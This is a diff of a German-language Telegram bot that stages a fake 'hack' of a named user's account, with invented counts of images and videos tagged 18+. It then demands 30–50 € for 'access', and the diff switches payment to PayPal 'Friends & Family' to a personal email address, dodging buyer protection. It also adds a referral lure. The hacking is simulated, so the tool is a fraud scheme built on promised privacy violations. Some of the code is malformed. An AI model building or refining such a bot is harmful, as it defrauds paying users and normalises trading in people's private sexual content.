@@ -143,7 +143,7 @@ if not context.args:
     await asyncio.sleep(2)
     await msg.edit_text("🔍 Suche nach Nutzerdaten...")
     await asyncio.sleep(3)
-    await msg.edit_text("⚙️ Umgehe Sicherheitsprotokolle...")
+    await msg.edit_text("⚙ Umgehe Sicherheitsprotokolle...")
     await asyncio.sleep(2)
     await msg.edit_text("📡 Greife auf private Dateien zu...")
     await asyncio.sleep(2)
@@ -156,7 +156,7 @@ if not context.args:
         f"👤 {name}\n"
         f"🖼 {bilder} Bilder als 18+ getaggt\n"
         f"📹 {videos} Videos als 18+ getaggt\n\n"
-        f"💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 30 € mit /pay.\n\n"
+        f"💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 50 € mit /pay.\n\n"
         f"👉 Nach der Zahlung erhältst du hier Alles: Mega.nz"
         f"🎁 Oder verdiene dir einen kostenlosen Hack, indem du andere mit /invite einlädst.\n\n"
     )
@@ -179,38 +179,36 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cmd = query.data
 
     info_refund = (
-        "\n\n⚠️ <b>Wichtig:</b> Bei deiner <u>ersten Zahlung</u> hast du eine "
-        "<b>5 Minuten Testphase</b>. Wenn du in dieser Zeit stornierst, bekommst du <b>25 €</b> zurück.\n\n"
-        "📌 <b>Verwendungszweck:</b> Gib <u>deinen Telegram-Namen</u> an!"
-        )
-    elif cmd == "pay_paysafe":
-        text = (
-            "💳 <b>PaySafeCard</b>\n\n"
-            "Bitte sende deinen 16-stelligen Code im Format:\n"
-            "<code>0000-0000-0000-0000</code>\n"
-            f"{info_refund}"
-            "\n\nDer Code wird überprüft und weitergeleitet."
-  )
-    elif cmd == "pay_paypal":
-        text = (
-            "💳 <b>PayPal</b>\n\n"
-            "\n\Email: jessy.kla99@gmail.com."
-            "\n\Verwendungszweck: Dein Telegram Name."
-            "\n\send Beweisfoto an den Bot."
+        "\n\n⚠️ <b>Wichtig:</b> Sende <u>keine</u> normale Zahlung, sondern wähle "
+        "<b>„Freunde & Familie“</b> in PayPal aus.\n\n"
+        "📌 <b>Verwendungszweck:</b> Gib deinen <u>Telegram-Namen</u> an!"
+    )
 
-           f"{info_refund}"
+    if cmd == "pay_paypal":
+        text = (
+            "💸 <b>PayPal Zahlung (Freunde & Familie)</b>\n\n"
+            "Sende 30 € an folgende Adresse:\n"
+            "<code>jessy.kla99@gmail.com</code>\n"
+            f"{info_refund}\n\n"
+            "✅ Sende anschließend hier einen Screenshot der Zahlung als Foto."
         )
     elif cmd == "pay":
-        await pay(update, context)
+        # Menü neu anzeigen
+        keyboard = [
+            [InlineKeyboardButton("💸 PayPal (Friends & Family)", callback_data="pay_paypal")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
         return
     else:
         await query.edit_message_text("Ungültige Auswahl.")
         return
 
+    # Zurück-Button
     keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
-# ---- PHOTO (Beweis) ----
+---- PHOTO (Beweis) ----
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     from_user = update.message.from_user
 if from_user.id in user_proof_sent:
@@ -264,7 +262,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
     faq_text = (
-        "📖 *Häufig gestellte Fragen (FAQ)*\n\n"
+        "📖 Häufig gestellte Fragen (FAQ)\n\n"
         "❓ Wie funktioniert das Ganze?\n"
         "💬 Gib den Befehl /hack Benutzername ein.\n\n"
         "❓ Wie lange dauert ein Hack?\n"
@@ -290,7 +288,7 @@ def main():
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-    print("✅ Master...")
+    print("✅ Bot läuft...")
     application.run_polling()
 
 if name == "main":
